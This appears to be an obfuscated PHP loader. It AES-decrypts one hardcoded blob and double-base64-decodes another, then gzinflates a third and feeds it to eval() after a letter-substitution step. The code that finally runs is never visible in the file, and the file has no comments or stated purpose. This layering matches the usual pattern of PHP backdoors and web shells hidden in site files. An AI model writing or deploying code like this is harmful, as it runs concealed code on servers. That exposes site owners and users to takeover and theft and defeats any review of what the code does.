<?php
function leexy($pesan, $encryption_key){$key = hex2bin($encryption_key); $pesan = base64_decode($pesan); $nonceSize = openssl_cipher_iv_length('aes-256-ctr'); $nonce = mb_substr($pesan, 0, $nonceSize, '8bit'); $cipherText = mb_substr($pesan, $nonceSize, null, '8bit'); $plaintext = openssl_decrypt($cipherText, 'aes-256-ctr', $key, OPENSSL_RAW_DATA, $nonce ); return $plaintext; } $private_secret_key = '1f4276388ad3214c873428dbef42243f';
$new = leexy('WsmgjNryTo6FGNXp+GxqtHSCZfEt9nOg5P2JUNSksNUjMQ5SGSk5GiSPHgIACbuMqPIBCDsymkXf3ex6Acy9+yXfPLWcRAhxtR3PYqwYP49L3Ra9NZFu+owACI3RLpzGHKT+is4iXSWeNaHnJeDLPKb/Cn2S7BW7Ca28nYqIxpvMRzazoHcBhiqGpD2zjh35ibk1mTeuiFwy7nv+fPc470R+i/+tR39S0nerceOlPSJSwik1lGhNskZUpOTNaepMnkIgwpzVrGisGREGdO1u6pH3ABwiiXsC',$private_secret_key);
$SISTEMIT_COM_ENC = "bZCxasQwDIb3g7yEueEKTbx0tJNHaKHdCwnkoHFC8HaUPpYeyAQyyGTwoMkcVHEaSEsNWqz///VJkJ2AX3Zqp6FB7wbw93g5Gz90j+ePKUzm4ROqclOp1tkeKOm0KApJ8xxxljaOzqJUlYbkZEMxLqOAPuLighYvz69vApDsNaIW77WhoRM/oSk4+Ds0huO0aMiGY++/fr5ECtGKUi1PZRqbUHmukuuPZD1HqIop4Cs7HdajkQEvx6X+ZrfO4Zp9wKsnRPbibYxazFPdexS7p8YBuPJAtoPWOMLc+uuCDOd3TUszbJU3ZOLA2pzMKpGea4vfeRK8kuutf+8A3w==";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP=$new;
?>